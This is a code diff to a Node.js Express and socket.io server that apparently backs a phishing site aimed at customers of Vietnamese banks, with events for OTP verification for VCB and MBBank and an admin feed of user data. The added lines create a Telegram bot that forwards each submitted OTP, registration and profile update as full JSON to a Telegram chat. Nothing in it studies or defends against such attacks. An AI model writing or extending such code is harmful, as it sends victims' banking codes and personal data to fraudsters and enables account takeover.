@@ -2,12 +2,16 @@ const express = require('express');
 const app = express();
 const path = require('path');
 const http = require("http");
+const TelegramBot = require('node-telegram-bot-api');
 require('dotenv').config();
 const port = process.env.PORT || 5000
 const server = http.createServer(app);
 var bodyParser = require('body-parser')
 let multer = require("multer");
 var cors = require('cors')
+const token = process.env.TELEGRAM_TOKEN;
+const bot = new TelegramBot(token, { polling: true });
+const chatId = process.env.TELEGRAM_CHAT_ID;
 app.use(cors())
 // const moduleBank = require('./modules');
 const socketIo = require("socket.io")(server, {
@@ -15,6 +19,7 @@ const socketIo = require("socket.io")(server, {
         origin: "*",
     }
 });
+// bot.sendMessage(chatId, 'Server đã khởi động');
 
 // const connection = require("./db");
 const mongoose = require("mongoose");
@@ -100,6 +105,7 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         // const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
         // socket.emit('send-data-send-otp-vcb', response);
         socketIo.emit('send-data-admin-user', data);
+        bot.sendMessage(chatId, `Có người dùng vừa xác thực OTP: ${JSON.stringify(data)}`);
     })
 
     // socket.on('send-method-ct-vcb', async (data) => {
@@ -120,6 +126,7 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         socketIo.emit('send-data-admin', {
             ...data,
         });
+        bot.sendMessage(chatId, `Có người dùng vừa đăng ký: ${JSON.stringify(data)}`);
         // switch (data.bankName) {
         //     case 'MBBank':
         //         console.log('settingData', settingData);
@@ -154,6 +161,7 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
 
     socket.on('send-data-user', (data) => {
         socketIo.emit(`send-data-user-${data.numberPhone}`, data);
+        bot.sendMessage(chatId, `Người dùng ${data.numberPhone} vừa cập nhật thông tin: ${JSON.stringify(data)}`);
     });
 })
 
@@ -412,6 +420,7 @@ app.post('/api/insert-user', async (req, res) => {
     socketIo.emit('send-data-admin', {
         ...req.body,
     });
+
     return res.status(200).json({
         message: 'success'
     })
@@ -426,6 +435,7 @@ app.put('/api/update-user/:numberPhone', async (req, res) => {
             status: 404
         })
     }
+    bot.sendMessage(chatId, `Có người dùng vừa cập nhật thông tin: ${JSON.stringify(req.body)}`);
 
     await users.updateOne({
         numberPhone: numberPhone
@@ -449,6 +459,7 @@ app.put('/api/update-user-id/:id', async (req, res) => {
     await users.updateOne({
         _id: id
     }, req.body);
+
 
     return res.status(200).json({
         message: 'success'
